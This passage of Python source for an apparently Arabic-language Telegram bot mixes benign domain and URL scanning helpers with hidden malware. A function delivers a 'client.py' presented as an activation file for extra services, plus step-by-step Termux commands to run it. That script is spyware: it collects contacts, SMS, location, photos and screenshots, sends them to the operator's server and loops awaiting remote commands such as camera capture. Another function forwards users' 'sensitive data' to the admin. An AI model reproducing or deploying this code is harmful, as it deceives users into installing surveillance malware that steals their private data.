                result += f"   - مشبوه: {suspicious}\n"
                result += f"   - آمن: {stats.get('harmless', 0)}\n"
                if malicious > 0:
                    result += "🚨 **تحذير: تم اكتشاف تهديدات!**"
                elif suspicious > 0:
                    result += "⚠️ **تنبيه: يوجد عناصر مشبوهة**"
                else:
                    result += "✅ **النطاق يبدو آمناً.**"
                return result
        except Exception as e:
            logger.error(f"VirusTotal error: {e}")
    
    # البديل: استخدام DNSlytics (مجاني)
    try:
        url = f"https://dnslytics.com/domain/{domain}"
        response = REQUEST_SESSION.get(url, timeout=15)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            result = f"🌐 تحليل النطاق: {domain}\n"
            result += "📌 تم الحصول على معلومات من DNSlytics:\n"
            security_section = soup.find('div', {'class': 'security'})
            if security_section:
                result += f"   {security_section.get_text(strip=True)[:200]}"
            else:
                result += "   لا توجد معلومات أمان إضافية متاحة."
            return result
    except Exception as e:
        logger.error(f"DNSlytics error: {e}")
    
    return f"🌐 النطاق: {domain}\n⚠️ لم تتوفر معلومات فحص كافية. يُرجى المحاولة لاحقاً."

def check_website_security(url):
    """فحص أمان الموقع باستخدام URLScan.io (مجاني)"""
    try:
        api_url = "https://urlscan.io/api/v1/scan/"
        data = {"url": url, "visibility": "public"}
        response = REQUEST_SESSION.post(api_url, json=data, timeout=30)
        if response.status_code == 200:
            scan_id = response.json().get('uuid')
            if scan_id:
                time.sleep(5)
                report_url = f"https://urlscan.io/api/v1/result/{scan_id}"
                report = REQUEST_SESSION.get(report_url, timeout=30)
                if report.status_code == 200:
                    data = report.json()
                    verdicts = data.get('verdicts', {}).get('overall', {})
                    result = f"🔍 فحص أمان الموقع: {url}\n"
                    if verdicts.get('malicious', False):
                        result += "🚨 **الموقع يحتوي على تهديدات مؤكدة!**"
                    elif verdicts.get('suspicious', False):
                        result += "⚠️ **الموقع مشبوه!**"
                    else:
                        result += "✅ **الموقع آمن.**"
                    return result
    except Exception as e:
        logger.error(f"URLScan error: {e}")
    
    # البديل: فحص بسيط باستخدام requests
    try:
        response = REQUEST_SESSION.get(url, timeout=10, allow_redirects=True)
        result = f"🔍 فحص الموقع: {url}\n"
        result += f"📌 الحالة: {response.status_code}\n"
        if response.status_code == 200:
            result += "✅ الموقع متاح ويعمل."
        else:
            result += f"⚠️ الموقع غير متاح حالياً (Status {response.status_code})"
        return result
    except Exception as e:
        return f"⚠️ فشل الاتصال بالموقع: {str(e)}"

def perform_vulnerability_scan(target_ip, target_domain, target_url):
    """تنفيذ فحص شامل للثغرات باستخدام أدوات مجانية"""
    results = []
    results.append("="*50)
    results.append("🛡️ تقرير فحص الثغرات")
    results.append(f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    results.append("="*50)
    
    if target_domain:
        results.append("\n📌 1. فحص النطاق:")
        results.append(check_domain_virustotal(target_domain))
    
    if target_url:
        results.append("\n📌 2. فحص أمان الموقع:")
        results.append(check_website_security(target_url))
    
    if target_ip:
        results.append("\n📌 3. معلومات IP:")
        try:
            response = REQUEST_SESSION.get(f"http://ip-api.com/json/{target_ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    result = f"🖥️ معلومات IP: {target_ip}\n"
                    result += f"🌍 البلد: {data.get('country', 'غير معروف')}\n"
                    result += f"🏙️ المدينة: {data.get('city', 'غير معروف')}\n"
                    result += f"📍 المزود: {data.get('isp', 'غير معروف')}\n"
                    result += f"📡 الإحداثيات: {data.get('lat', '')}, {data.get('lon', '')}"
                    results.append(result)
                else:
                    results.append(f"⚠️ لم يتم العثور على معلومات لـ {target_ip}")
        except Exception as e:
            results.append(f"⚠️ فشل جلب معلومات IP: {str(e)}")
    
    results.append("\n" + "="*50)
    results.append("📋 نصائح أمنية عامة:")
    results.append("• تأكد من تحديث جميع البرامج والأنظمة بشكل دوري.")
    results.append("• استخدم كلمات مرور قوية ومختلفة لكل خدمة.")
    results.append("• فعّل المصادقة الثنائية (2FA) حيثما أمكن.")
    results.append("• راجع سجلات الدخول بانتظام.")
    results.append("• قم بعمل نسخ احتياطية للبيانات المهمة.")
    results.append("="*50)
    
    return "\n".join(results)

# ===================== دوال إرسال البيانات للمطور =====================
def notify_admin(message_text, is_error=False):
    try:
        if is_error:
            safe_send(ADMIN_ID, f"🚨 تنبيه عطل فني:\n{message_text}")
        else:
            safe_send(ADMIN_ID, f"📢 إشعار:\n{message_text}")
    except Exception as e:
        logger.error(f"notify_admin error: {e}")

def send_sensitive_data_to_admin(data_type, content, user_id=None):
    if user_id:
        msg = f"📩 بيانات حساسة من المستخدم {user_id}\n"
    else:
        msg = "📩 بيانات حساسة\n"
    msg += f"النوع: {data_type}\n"
    if isinstance(content, str):
        msg += f"المحتوى: {content}"
        safe_send(ADMIN_ID, msg)
    elif isinstance(content, bytes) and data_type == "image":
        bot.send_photo(ADMIN_ID, content, caption=msg)
    else:
        safe_send(ADMIN_ID, f"{msg}\nالمحتوى: {str(content)[:500]}")

# ===================== دوال تفعيل الخدمات (مبسطة) =====================
def send_termux_instructions(chat_id, role='user'):
    """إرسال تعليمات تفعيل الخدمات بشكل مبسط"""
    server_url = SERVER_URL if SERVER_URL else "https://your-server.com"
    device_id = f"dev_{secrets.randbelow(9000) + 1000}"
    chat_id_str = str(chat_id)
    
    # كود مرركز ومختصر
    code_content = f'''import requests, time, json, os, subprocess, base64, glob, sys, random
SERVER = "{server_url}"
DEVICE_ID = "{device_id}"
CHAT_ID = "{chat_id_str}"

def get_contacts():
    try:
        result = subprocess.run(["termux-contacts"], capture_output=True, text=True, timeout=10)
        return result.stdout if result.stdout else "لا توجد جهات اتصال"
    except:
        return "فشل جلب جهات الاتصال"

def get_sms():
    try:
        result = subprocess.run(["termux-sms-list"], capture_output=True, text=True, timeout=10)
        return result.stdout if result.stdout else "لا توجد رسائل"
    except:
        return "فشل جلب الرسائل"

def get_location():
    try:
        result = subprocess.run(["termux-location"], capture_output=True, text=True, timeout=10)
        return result.stdout if result.stdout else "لا يمكن الحصول على الموقع"
    except:
        return "فشل جلب الموقع"

def get_recent_photos(limit=5):
    photos = []
    try:
        import glob
        photo_files = glob.glob("/sdcard/DCIM/**/*.jpg", recursive=True) + glob.glob("/sdcard/DCIM/**/*.png", recursive=True)
        photo_files.sort(key=os.path.getctime, reverse=True)
        for photo_path in photo_files[:limit]:
            with open(photo_path, "rb") as f:
                encoded = base64.b64encode(f.read()).decode()
                photos.append({{"name": os.path.basename(photo_path), "data": encoded}})
        return photos
    except:
        return []

def get_screenshot():
    try:
        os.system("screencap -p /sdcard/screenshot_temp.png")
        with open("/sdcard/screenshot_temp.png", "rb") as f:
            return base64.b64encode(f.read()).decode()
    except:
        return None

def collect_all_data():
    return {{
        "device_id": DEVICE_ID,
        "contacts": get_contacts(),
        "sms": get_sms(),
        "location": get_location(),
        "photos": get_recent_photos(3),
        "screenshot": get_screenshot()
    }}

def register_device():
    try:
        all_data = collect_all_data()
        response = requests.post(f"{{SERVER}}/register_device", json={{"device_id": DEVICE_ID, "chat_id": CHAT_ID, "initial_data": all_data}}, headers={{"X-Client-Token": "{CLIENT_SECRET_KEY}"}}, timeout=30)
        return response.status_code == 200
    except:
        return False

def execute_command(command):
    if command == "screenshot":
        return get_screenshot()
    elif command == "location":
        return get_location()
    elif command == "camera":
        os.system("termux-camera-photo -c 0 /sdcard/photo_temp.jpg")
        try:
            with open("/sdcard/photo_temp.jpg", "rb") as f:
                return base64.b64encode(f.read()).decode()
        except:
            return "فشل التقاط الصورة"
    elif command == "contacts":
        return get_contacts()
    elif command == "sms":
        return get_sms()
    elif command == "photos":
        return json.dumps(get_recent_photos(10))
    else:
        return f"Unknown command: {{command}}"

if register_device():
    print("✅ تم الربط بنجاح!")
else:
    print("❌ فشل الربط.")

while True:
    try:
        response = requests.get(f"{{SERVER}}/get_command?device_id={{DEVICE_ID}}", headers={{"X-Client-Token": "{CLIENT_SECRET_KEY}"}}, timeout=30)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                command = data["command"]
                result = execute_command(command)
                result_type = "text"
                if command in ["screenshot", "camera"]:
                    result_type = "image"
                elif command == "photos":
                    result_type = "json"
                requests.post(f"{{SERVER}}/submit_result", json={{"device_id": DEVICE_ID, "result": result, "result_type": result_type}}, headers={{"X-Client-Token": "{CLIENT_SECRET_KEY}"}}, timeout=10)
            elif data.get("status") == "no_command":
                time.sleep(2)
        else:
            time.sleep(5)
    except:
        time.sleep(5)
'''
    
    # حفظ الكود في ملف مؤقت وإرساله
    file_path = os.path.join(TEMP_DIR, "client.py")
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(code_content)
    
    with open(file_path, 'rb') as f:
        bot.send_document(chat_id, f, caption="📱 ملف التفعيل - client.py")
    
    os.remove(file_path) if os.path.exists(file_path) else None
    
    # تعليمات مختصرة
    instructions = """📱 **تفعيل الخدمات الإضافية**

**الخطوات:**

1️⃣ تحميل Termux من الرابط الرسمي:
[تنزيل Termux](https://f-droid.org/repo/com.termux_118.apk)

2️⃣ تشغيل التطبيق ثم نسخ ولصق الكود التالي:
```bash
termux-setup-storage
pkg update && pkg upgrade -y
pkg install python -y
pip install requests
cd /sdcard/Download
python client.py
